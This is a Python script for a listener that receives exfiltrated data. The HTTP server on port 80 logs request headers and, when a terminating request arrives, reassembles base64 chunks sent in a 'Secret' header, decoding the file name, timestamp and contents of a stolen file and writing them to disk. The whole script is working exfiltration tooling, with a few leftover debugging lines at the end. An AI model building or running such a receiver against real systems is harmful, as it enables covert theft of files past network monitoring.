import http.server as SimpleHTTPServer
import socketserver as SocketServer
import logging
import sys
from contextlib import redirect_stdout
import os
import re
import base64

PORT = 80

logging.basicConfig(level=logging.ERROR,
                    format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
                    datefmt='%m-%d %H:%M',
                    filename='data_exfil.log',
                    filemode='w')

class GetHandler(
    SimpleHTTPServer.SimpleHTTPRequestHandler
    ):

    def do_GET(self):
        logging.error(self.headers)
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        secret = self.headers.get('Secret')

        #triggers when terminating packet is recieved
        if secret is None:
            #Close HTTP Server
            httpd.server_close()

            f = open("data_exfil.log", "r")
            pattern="Secret"


            line_num = 0
            for line in f:
                if re.search(pattern, line):
                    #Strips away any extra spaces or line breaks
                    strip_line = line.strip()
                    #Strips away heade field
                    headless_line = strip_line.split(" ")[1]
                    #Seperates data from timestamp and file name info
                    data_line = headless_line.split(".")[3]

                    #For the first log entry grab filename and timestamp
                    if line_num == 0:
                        #Extract Base64 timestamp
                        time_stamp_base64 = headless_line.split(".")[0]
                        time_stamp_base64_bytes = time_stamp_base64.encode('ascii')
                        time_stamp_message_bytes = base64.b64decode(time_stamp_base64_bytes)
                        time_stamp = time_stamp_message_bytes.decode('ascii')

                        #Extract base64 filename
                        file_name_base64 = headless_line.split(".")[1]
                        file_name_base64_bytes = file_name_base64.encode('ascii')
                        file_name_message_bytes = base64.b64decode(file_name_base64_bytes)
                        file_name = file_name_message_bytes.decode('ascii')

                        #names output file based on exfil file name and epoch timestamp
                        output_name = file_name+"-"+time_stamp

                        base64_text = data_line

                    #Concatinates all data chunks
                    if line_num > 0:
                        base64_text = base64_text+data_line

                    line_num = line_num+1
            output = open(output_name, "w")

            #Decodes exfil data from base64
            text_base64_bytes = base64_text.encode('ascii')
            text_message_bytes = base64.b64decode(text_base64_bytes)
            decoded_text = text_message_bytes.decode('ascii')

            #Prints decoded exfil data to the terminal
            output.write(decoded_text)

            #Prints decoded exfil data to the terminal
            print (decoded_text)

            #closes out of python
            sys.exit()






Handler = GetHandler
httpd = SocketServer.TCPServer(("", PORT), Handler)

stdout_fd = sys.stdout.fileno()
with open('output.txt', 'w') as f, redirect_stdout(f):
    print('listening...')
    os.write(stdout_fd, b'not redirected')
    os.system('echo this also is not redirected')

httpd.serve_forever()